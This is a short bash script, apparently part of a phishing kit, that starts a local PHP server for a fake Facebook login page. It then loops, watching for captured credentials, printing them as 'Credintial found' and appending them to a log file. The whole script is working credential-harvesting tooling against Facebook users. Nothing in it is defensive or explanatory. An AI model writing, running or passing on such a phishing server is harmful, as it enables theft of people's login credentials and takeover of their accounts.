#!/bin/bash
#This script written by sachin
#
echo ''
echo -n "Enter port : "
read port
if [[ $port == "" ]]; then
	exit 1
fi
echo ""
echo -e "Server stared at \033[1;32mhttp://localhost:$port\033[1;39m"
echo ""
echo "Press ctrl + c for exit "
echo ''
while [ 1 ]
do
        if [ -d files/facebook/php ]
        then
                cd files/facebook/php && php -S localhost:$port > /dev/null 2>&1 &
                if [ -e files/facebook/php/file.txt ]
                then
                        echo -e "\033[1;32mCredintial found [!]"
                        echo -e '\033[1;39m'
                        if [ ! -e files/facebook/php/l.txt ]
                        then
                                touch files/facebook/php/l.txt
                        fi
                        cat files/facebook/php/file.txt >> files/facebook/php/l.txt
                        cat files/facebook/php/file.txt
                        rm files/facebook/php/file.txt
                        echo -e '\033[1;39m'
                        sleep 2
                        echo ""
                        echo -e "Server stared at \033[1;32mhttp://localhost:$port\033[1;39m"
			echo ""
                fi
                sleep 2

        else
                sleep 2
                echo ''
                echo "[-] Server has been stopped"
                echo ''
                break
        fi
done
